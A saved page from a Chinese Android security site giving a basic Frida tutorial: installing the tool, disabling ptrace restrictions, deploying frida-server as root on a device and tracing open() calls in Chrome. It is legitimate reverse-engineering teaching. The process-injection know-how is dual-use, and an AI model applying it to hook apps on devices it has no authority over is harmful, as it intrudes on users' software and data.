<!DOCTYPE html><!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="zh-CN"> <![endif]--><!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8" lang="zh-CN"> <![endif]--><!--[if IE 8]> <html class="no-js lt-ie9" lang="zh-CN"> <![endif]--><!--[if gt IE 8]><!-->
<!-- saved from url=(0120)http://www.droidsec.cn/frida-%e8%b7%a8%e5%b9%b3%e5%8f%b0%e6%b3%a8%e5%85%a5%e5%b7%a5%e5%85%b7%e5%9f%ba%e7%a1%80%e7%af%87/ -->
<html class="no-js" lang="zh-CN"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Android Security 安卓安全中文站 | 移动安全技术与资讯分享 | 安卓应用漏洞挖掘 | 安卓漏洞攻防">
<meta name="author" content="K | Uazoh.com">
<title>Frida-跨平台注入工具基础篇  |  DroidSec.cn</title>
<link rel="icon" type="image/png" href="http://www.droidsec.cn/wp-content/uploads/2015/03/1112.png"><link rel="alternate" type="application/rss+xml" title="DroidSec.cn » Frida-跨平台注入工具基础篇评论Feed" href="http://www.droidsec.cn/frida-%e8%b7%a8%e5%b9%b3%e5%8f%b0%e6%b3%a8%e5%85%a5%e5%b7%a5%e5%85%b7%e5%9f%ba%e7%a1%80%e7%af%87/feed/">
		
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel="stylesheet" id="crayon-css" href="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/crayon.min.css" type="text/css" media="all">
<link rel="stylesheet" id="crayon-theme-github-css" href="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/github.css" type="text/css" media="all">
<link rel="stylesheet" id="crayon-font-monaco-css" href="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/monaco.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-bootstrap-css" href="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/bootstrap.min.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-animate-css" href="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/animate.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-mCustomScrollbar-css" href="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/jquery.mCustomScrollbar.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-font-awesome-css" href="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/font-awesome.min.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-main-css" href="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/main.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-h1-css" href="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/h1.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-responsive-css" href="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/responsive.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-color-scheme-css" href="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/color.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-default-style-css" href="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/style.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-LayerSlider-css" href="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/layerslider.css" type="text/css" media="all">
<style type="text/css"></style>



<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.droidsec.cn/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.droidsec.cn/wp-includes/wlwmanifest.xml"> 
<link rel="prev" title="E安全App v2.1 更新发布" href="http://www.droidsec.cn/e%e5%ae%89%e5%85%a8app-v2-1-%e6%9b%b4%e6%96%b0%e5%8f%91%e5%b8%83/">
<link rel="next" title="AppUse(Android测试平台)用户手册 v2-2" href="http://www.droidsec.cn/appuse-android%e6%b5%8b%e8%af%95%e5%b9%b3%e5%8f%b0%e7%94%a8%e6%88%b7%e6%89%8b%e5%86%8c/">
<meta name="generator" content="WordPress 4.2.2">
<link rel="canonical" href="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/Frida-跨平台注入工具基础篇 _ DroidSec.cn.html">
<link rel="shortlink" href="http://www.droidsec.cn/?p=266">
<style type="text/css" media="screen">#wp-admin-bar-user-info .avatar-64 {width:64px}</style>
<style></style></head>
<body class="single single-post postid-266 single-format-standard">
<!--专版参数-->
<div id="to-the-top" title="返回顶端" style="display: none;"><i class="fa fa-chevron-up"></i></div>
<!--移动菜单-->
<i class="fa fa-align-justify" id="uazoh7-mobile-menu-btn"></i>
<div class="uazoh7-mobile-menu" id="uazoh7-mobile-menu"> <h3>菜单</h3>
<nav class="menu-%e8%8f%9c%e5%8d%951-container mCustomScrollbar _mCS_1" style="max-height: 871px; overflow: hidden;"><div class="mCustomScrollBox mCS-light" id="mCSB_1" style="position: relative; height: 100%; overflow: hidden; max-width: 100%; max-height: 871px;"><div class="mCSB_container mCS_no_scrollbar" style="position:relative; top:0;"><ul id="mobile_nav" class="mobile-menu"><li><a href="http://www.droidsec.cn/">首页</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/android-security-basic/">Android安全基础</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/app%e5%ae%89%e5%85%a8%e6%b5%8b%e8%af%95%e5%85%a5%e9%97%a8/">APP安全测试入门</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/%e9%87%91%e5%88%9a%e5%ae%a1%e8%ae%a1%e7%b3%bb%e7%bb%9f/">金刚审计系统</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/%e5%85%b3%e4%ba%8e%e6%9c%ac%e7%ab%99/">关于DroidSec</a><span class="border"></span></li>
<li><a href="http://weibo.com/androidsec">关注本站微博</a><span class="border"></span></li>
</ul></div><div class="mCSB_scrollTools" style="position: absolute; display: none;"><div class="mCSB_draggerContainer"><div class="mCSB_dragger" style="position: absolute; top: 0px;" oncontextmenu="return false;"><div class="mCSB_dragger_bar" style="position:relative;"></div></div><div class="mCSB_draggerRail"></div></div></div></div><span class="border"></span></nav></div>
    <header class="uazoh7-header uazoh7-header-1">

      <div class="uazoh7-top-bar">
        <div class="container">
          <div class="row">
            <div class="col-lg-12">
              
              <ul class="social-btns">
								<li><a href="http://www.droidsec.cn/feed" title="rss" class="rss regular" target="_blank"><i class="fa fa-rss"></i></a><a href="http://www.droidsec.cn/feed" title="rss" class="rss hover" target="_blank"><i class="fa fa-rss"></i></a></li><li><a href="http://weibo.com/androidsec" title="weibo" class="weibo regular" target="_blank"><i class="fa fa-weibo"></i></a><a href="http://weibo.com/androidsec" title="weibo" class="weibo hover" target="_blank"><i class="fa fa-weibo"></i></a></li><li><a href="http://droidsec/#QQ.com" title="envelope" class="envelope regular" target="_blank"><i class="fa fa-envelope"></i></a><a href="http://droidsec/#QQ.com" title="envelope" class="envelope hover" target="_blank"><i class="fa fa-envelope"></i></a></li>              </ul>
            </div>
          </div>
        </div>
      </div>	   <div class="uazoh7-header-bg" id="uazoh7-header-menu">
        <div class="container">
          <div class="row">
            <div class="col-lg-12">
              <div class="uazoh7-relative">
                <a href="http://www.droidsec.cn/" title="DroidSec.cn">
                <div class="uazoh7-logo">                  <img src="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/a1a.png" alt="DroidSec.cn">                  <p class="logo">DroidSec.cn</p>
                  <p class="tagline">安卓安全中文站</p>
                </div>
                </a>
				<nav class="menu-%e8%8f%9c%e5%8d%951-container"><ul id="main_nav" class="main-menu"><li><a href="http://www.droidsec.cn/">首页</a><span class="hover"></span></li>
<li><a href="http://www.droidsec.cn/android-security-basic/">Android安全基础</a><span class="hover"></span></li>
<li><a href="http://www.droidsec.cn/app%e5%ae%89%e5%85%a8%e6%b5%8b%e8%af%95%e5%85%a5%e9%97%a8/">APP安全测试入门</a><span class="hover" style="display: none;"></span></li>
<li><a href="http://www.droidsec.cn/%e9%87%91%e5%88%9a%e5%ae%a1%e8%ae%a1%e7%b3%bb%e7%bb%9f/">金刚审计系统</a><span class="hover" style="display: none;"></span></li>
<li><a href="http://www.droidsec.cn/%e5%85%b3%e4%ba%8e%e6%9c%ac%e7%ab%99/">关于DroidSec</a><span class="hover"></span></li>
<li><a href="http://weibo.com/androidsec">关注本站微博</a><span class="hover"></span></li>
</ul></nav>              </div>
            </div>
          </div>
        </div>
      </div>    </header><div class="uazoh7-content" style="padding-top: 0px;"><section class="uazoh7-page-title-1" data-stellar-background-ratio="0.5">
        <div class="container">
          <div class="row">
            <div class="col-lg-9 col-md-9 col-sm-9">
			
								<h1>文章</h1>
				            </div>
            <div class="col-lg-3 col-md-3 col-sm-3">
              <form class="search" method="get" action="http://www.droidsec.cn/"><input type="text" placeholder="输入关键词后回车..." id="s" name="s" value=""><button type="submit" value="Search"><i class="fa fa-search"></i></button></form>            </div>
          </div>
        </div>
      </section>
      <section class="uazoh7-desktop-breadscrubs">
        <div class="container">
          <div class="row">
            <div class="col-lg-12">
              <div class="uazoh7-desktop-breadscrubs-inner">
                 <a href="http://www.droidsec.cn/">Home</a> <i class="fa fa-angle-double-right"></i> <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e5%ae%89%e5%85%a8%e5%b7%a5%e5%85%b7/">安卓安全工具</a> <i class="fa fa-angle-double-right"></i> Frida-跨平台注入工具基础篇              </div>
            </div>
          </div>
        </div>
      </section>
      <section class="uazoh7-mobile-breadscrubs">
        <div class="container">
          <div class="row">
            <div class="col-lg-12">
               <a href="http://www.droidsec.cn/">Home</a> <i class="fa fa-angle-double-right"></i> <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e5%ae%89%e5%85%a8%e5%b7%a5%e5%85%b7/">安卓安全工具</a> <i class="fa fa-angle-double-right"></i> Frida-跨平台注入工具基础篇            </div>
          </div>
        </div>
      </section><section class="uazoh7-section">
<div class="container">
<div class="row" style="margin-top: 0px;">
<div class="col-lg-9" id="main"><article id="post-266" class="uazoh7-post post-266 post type-post status-publish format-standard hentry category-3 category-5">
<header>
<h3 style="margin-top: 0px;"><i class="fa fa-pencil"></i><span> Frida-跨平台注入工具基础篇</span></h3>
<p> <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e5%ae%89%e5%85%a8%e5%b7%a5%e5%85%b7/" rel="category tag">安卓安全工具</a>, <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e9%80%86%e5%90%91%e5%88%86%e6%9e%90/" rel="category tag">安卓逆向分析</a> by <a href="http://www.droidsec.cn/author/droidsec/" title="由droidsec发布" rel="author">droidsec</a></p>
</header>

<h3>0x00 功能介绍</h3>
<hr>
<p><a href="http://www.frida.re/">官方主页</a></p>
<p><a href="http://github.com/frida/">github</a></p>
<p>Inject JavaScript to explore native apps on Windows, Mac, Linux, iOS and Android.</p>
<ul>
<li>Hooking Functions</li>
<li>Modifying Function Arguments</li>
<li>Calling Functions</li>
<li>Sending messages from a target process</li>
<li>Handling runtime errors from JavaScript</li>
<li>Receiving messages in a target process</li>
<li>Blocking receives in the target process</li>
<li>….</li>
</ul>
<p>类似工具:Substrate/Xposed/indroid/adbi.</p>
<h3>0x01 Setting up your PC</h3>
<hr>
<p>python环境+<a href="https://pypi.python.org/pypi/setuptools">setuptools</a></p>
<div>
<div id="highlighter_641692" class="syntaxhighlighter  bash">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="bash functions">sudo</code> <code class="bash plain">easy_install frida </code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>可选:源码编译</p>
<div>
<div id="highlighter_508122" class="syntaxhighlighter  bash">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="bash plain">$ git clone git:</code><code class="bash plain">//github</code><code class="bash plain">.com</code><code class="bash plain">/frida/frida</code><code class="bash plain">.git</code></div>
<div class="line number2 index1 alt1"><code class="bash plain">$ </code><code class="bash functions">cd</code> <code class="bash plain">frida</code></div>
<div class="line number3 index2 alt2"><code class="bash plain">$ </code><code class="bash functions">make</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<h4>0x02 Testing your installation</h4>
<hr>
<p>创建一个进程用于注入:</p>
<div>
<div id="highlighter_538237" class="syntaxhighlighter  bash">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="bash plain">$ </code><code class="bash functions">cat</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>新建注入脚本example.py:</p>
<div>
<div id="highlighter_305291" class="syntaxhighlighter  python">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="python keyword">import</code> <code class="python plain">frida</code></div>
<div class="line number2 index1 alt1"><code class="python plain">session </code><code class="python keyword">=</code> <code class="python plain">frida.attach(</code><code class="python string">"cat"</code><code class="python plain">)</code></div>
<div class="line number3 index2 alt2"><code class="python functions">print</code><code class="python plain">([x.name </code><code class="python keyword">for</code> <code class="python plain">x </code><code class="python keyword">in</code> <code class="python plain">session.enumerate_modules()])</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>linux环境下需要运行如下命令:</p>
<div>
<div id="highlighter_393228" class="syntaxhighlighter  bash">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="bash plain">$ </code><code class="bash functions">sudo</code> <code class="bash plain">sysctl kernel.yama.ptrace_scope=0</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>用于开启非子进程的ptracing.</p>
<p>运行frida脚本,观察:</p>
<div>
<div id="highlighter_822459" class="syntaxhighlighter  bash">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="bash plain">$ python example.py</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>输出结果类似如下,代码环境正常安装成功:</p><!-- Crayon Syntax Highlighter v2.7.1 -->

		<div id="crayon-55a7aef3bae83229587818" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; position: absolute; z-index: 2;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码" style="display: none;"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">[u'cat', …, u'ld-2.15.so']
</textarea></div>
			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
				<table class="crayon-table">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7aef3bae83229587818-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aef3bae83229587818-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7aef3bae83229587818-1"><span class="crayon-sy">[</span><span class="crayon-i">u</span><span class="crayon-s">'cat'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span>…<span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">u</span><span class="crayon-s">'ld-2.15.so'</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aef3bae83229587818-2">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0056 seconds] -->
<p></p>
<h3>0x03 Setting up your Android device</h3>
<hr>
<p>首先下载android版frida-server:</p>
<div>
<div id="highlighter_858793" class="syntaxhighlighter  bash">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="bash plain">$ curl -O http:</code><code class="bash plain">//build</code><code class="bash plain">.frida.re</code><code class="bash plain">/frida/android/arm/bin/frida-server</code></div>
<div class="line number2 index1 alt1"><code class="bash plain">$ </code><code class="bash functions">chmod</code> <code class="bash plain">+x frida-server</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>下一步部署到android设备上:</p>
<div>
<div id="highlighter_27994" class="syntaxhighlighter  bash">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="bash plain">$ adb push frida-server </code><code class="bash plain">/data/local/tmp/</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<h3>0x04 Spin up Frida</h3>
<hr>
<p>设备上运行frida-server:</p>
<div>
<div id="highlighter_798957" class="syntaxhighlighter  bash">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
<div class="line number4 index3 alt1">4</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="bash plain">$ adb shell </code></div>
<div class="line number2 index1 alt1"><code class="bash plain">root@android:/ </code><code class="bash comments"># chmod 700 frida-server&nbsp;&nbsp;</code></div>
<div class="line number3 index2 alt2"><code class="bash plain">$ adb shell </code></div>
<div class="line number4 index3 alt1"><code class="bash plain">root@android:/ </code><code class="bash comments"># /data/local/tmp/frida-server -t 0 (注意在root下运行)</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>电脑上运行adb forward tcp转发:</p>
<div>
<div id="highlighter_79722" class="syntaxhighlighter  bash">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="bash plain">adb forward tcp:27042 tcp:27042</code></div>
<div class="line number2 index1 alt1"><code class="bash plain">adb forward tcp:27043 tcp:27043</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>27042端口用于与frida-server通信,之后的每个端口对应每个注入的进程.</p>
<p>运行如下命令验证是否成功安装:</p>
<div>
<div id="highlighter_425625" class="syntaxhighlighter  bash">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="bash plain">$ frida-</code><code class="bash functions">ps</code> <code class="bash plain">-R</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>正常情况应该输出进程列表如下:</p><!-- Crayon Syntax Highlighter v2.7.1 -->

		<div id="crayon-55a7aef3baec5327274572" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; position: absolute; z-index: 2;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码" style="display: none;"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">PID NAME
 1590 com.facebook.katana
13194 com.facebook.katana:providers
12326 com.facebook.orca
13282 com.twitter.android
…
</textarea></div>
			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
				<table class="crayon-table">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7aef3baec5327274572-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aef3baec5327274572-2">2</div><div class="crayon-num" data-line="crayon-55a7aef3baec5327274572-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aef3baec5327274572-4">4</div><div class="crayon-num" data-line="crayon-55a7aef3baec5327274572-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aef3baec5327274572-6">6</div><div class="crayon-num" data-line="crayon-55a7aef3baec5327274572-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7aef3baec5327274572-1"><span class="crayon-e">PID </span><span class="crayon-i">NAME</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aef3baec5327274572-2"><span class="crayon-h"> </span><span class="crayon-cn">1590</span><span class="crayon-h"> </span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">facebook</span><span class="crayon-sy">.</span><span class="crayon-i">katana</span></div><div class="crayon-line" id="crayon-55a7aef3baec5327274572-3"><span class="crayon-cn">13194</span><span class="crayon-h"> </span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">facebook</span><span class="crayon-sy">.</span><span class="crayon-v">katana</span><span class="crayon-o">:</span><span class="crayon-i">providers</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aef3baec5327274572-4"><span class="crayon-cn">12326</span><span class="crayon-h"> </span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">facebook</span><span class="crayon-sy">.</span><span class="crayon-i">orca</span></div><div class="crayon-line" id="crayon-55a7aef3baec5327274572-5"><span class="crayon-cn">13282</span><span class="crayon-h"> </span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">twitter</span><span class="crayon-sy">.</span><span class="crayon-i">android</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aef3baec5327274572-6">…</div><div class="crayon-line" id="crayon-55a7aef3baec5327274572-7">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0033 seconds] -->
<p></p>
<h3>0x05 Tracing open() calls in Chrome</h3>
<hr>
<p>设备上打开chrome浏览器然后在pc运行如下命令:</p>
<div>
<div id="highlighter_831597" class="syntaxhighlighter  bash">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
<div class="line number4 index3 alt1">4</div>
<div class="line number5 index4 alt2">5</div>
<div class="line number6 index5 alt1">6</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="bash plain">$ frida-trace -R -i </code><code class="bash functions">open</code> <code class="bash plain">com.android.chrome </code></div>
<div class="line number2 index1 alt1"><code class="bash plain">Uploading data... </code></div>
<div class="line number3 index2 alt2"><code class="bash functions">open</code><code class="bash plain">: Auto-generated handler …</code><code class="bash plain">/linker/open</code><code class="bash plain">.js </code></div>
<div class="line number4 index3 alt1"><code class="bash functions">open</code><code class="bash plain">: Auto-generated handler …</code><code class="bash plain">/libc</code><code class="bash plain">.so</code><code class="bash plain">/open</code><code class="bash plain">.js </code></div>
<div class="line number5 index4 alt2"><code class="bash plain">Started tracing 2 functions. </code></div>
<div class="line number6 index5 alt1"><code class="bash plain">Press ENTER to stop.</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>开始使用chrome app然后会发现open()调用输出如下:</p><!-- Crayon Syntax Highlighter v2.7.1 -->

		<div id="crayon-55a7aef3baed9806445233" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; position: absolute; z-index: 2;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码" style="display: none;"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">1392 ms open()
1403 ms open()
1420 ms open()
</textarea></div>
			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
				<table class="crayon-table">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7aef3baed9806445233-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aef3baed9806445233-2">2</div><div class="crayon-num" data-line="crayon-55a7aef3baed9806445233-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aef3baed9806445233-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7aef3baed9806445233-1"><span class="crayon-cn">1392</span><span class="crayon-h"> </span><span class="crayon-e">ms </span><span class="crayon-e">open</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aef3baed9806445233-2"><span class="crayon-cn">1403</span><span class="crayon-h"> </span><span class="crayon-e">ms </span><span class="crayon-e">open</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-55a7aef3baed9806445233-3"><span class="crayon-cn">1420</span><span class="crayon-h"> </span><span class="crayon-e">ms </span><span class="crayon-e">open</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aef3baed9806445233-4">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
